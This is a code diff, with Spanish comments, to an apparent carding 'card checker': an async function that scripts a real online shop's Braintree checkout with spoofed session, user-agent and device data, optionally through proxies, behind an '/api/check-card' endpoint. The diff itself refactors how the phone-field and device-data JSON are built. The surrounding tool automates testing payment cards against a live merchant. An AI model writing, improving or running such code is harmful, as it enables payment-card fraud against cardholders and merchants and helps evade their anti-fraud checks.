@@ -487,6 +487,26 @@ async def braintree_18_99_eur(card: str, use_proxy: bool = True) -> Optional[Tup
             
             # REQ 6: POST to checkout final
             req_num = 6
+            
+            # Crear el phone field JSON correctamente
+            phone_field_data = {
+                "billing": {
+                    "code": "1",
+                    "number": phone,
+                    "hidden": "no"
+                },
+                "shipping": {
+                    "code": "",
+                    "number": "",
+                    "hidden": ""
+                }
+            }
+            phone_field_json = json.dumps(phone_field_data)
+            
+            # Crear el device data JSON
+            device_data = {"correlation_id": session_id}
+            device_data_json = json.dumps(device_data)
+            
             resp = await session.post(
                 "https://nammanmuay.eu/?wc-ajax=checkout&wfacp_id=54599&wfacp_is_checkout_override=yes",
                 headers={
@@ -514,10 +534,7 @@ async def braintree_18_99_eur(card: str, use_proxy: bool = True) -> Optional[Tup
                         '{"pre_built":{},"oxy":{"wfacp_form":"wfacp_oxy_checkout_form","order_summary":"wfacp_order_summary_widget"}}',
                     ),
                     ("wfacp_input_hidden_data", "{}"),
-                    (
-                        "wfacp_input_phone_field",
-                        f'{{"billing":{{"code":"1","number":"{phone}","hidden":"no"}},"shipping":{{"code":"","number":"","hidden":""}}}',
-                    ),
+                    ("wfacp_input_phone_field", phone_field_json),
                     ("wfacp_timezone", "America/New_York"),
                     ("wc_order_attribution_source_type", "typein"),
                     (
@@ -540,10 +557,7 @@ async def braintree_18_99_eur(card: str, use_proxy: bool = True) -> Optional[Tup
                     ("wc_order_attribution_session_start_time", start_time),
                     ("wc_order_attribution_session_pages", "2"),
                     ("wc_order_attribution_session_count", "1"),
-                    (
-                        "wc_order_attribution_user_agent",
-                        user_agent,
-                    ),
+                    ("wc_order_attribution_user_agent", user_agent),
                     ("wfacp_billing_address_present", "yes"),
                     ("wfob_input_hidden_data", "{}"),
                     ("wfob_input_bump_shown_ids", "54600"),
@@ -570,10 +584,7 @@ async def braintree_18_99_eur(card: str, use_proxy: bool = True) -> Optional[Tup
                     ("shipping_method[0]", "flat_rate:53"),
                     ("payment_method", "braintree_cc"),
                     ("braintree_cc_nonce_key", nonce),
-                    (
-                        "braintree_cc_device_data",
-                        f'{{"correlation_id":"{session_id}"}}',
-                    ),
+                    ("braintree_cc_device_data", device_data_json),
                     ("braintree_cc_3ds_nonce_key", ""),
                     (
                         "braintree_cc_config_data",
@@ -608,10 +619,7 @@ async def braintree_18_99_eur(card: str, use_proxy: bool = True) -> Optional[Tup
                     ("wc_order_attribution_session_start_time", start_time),
                     ("wc_order_attribution_session_pages", "2"),
                     ("wc_order_attribution_session_count", "1"),
-                    (
-                        "wc_order_attribution_user_agent",
-                        user_agent,
-                    ),
+                    ("wc_order_attribution_user_agent", user_agent),
                     ("billing_state", ""),
                     ("shipping_state", ""),
                     ("ship_to_different_address", "1"),
@@ -656,7 +664,7 @@ async def braintree_18_99_eur(card: str, use_proxy: bool = True) -> Optional[Tup
             print(f"[ERROR] Request {req_num} failed: {e}")
             return None
 
-# Rutas de la API (mantener las mismas que antes)
+# Rutas de la API
 @app.route('/api/check-card', methods=['POST'])
 def check_single_card():
     try:
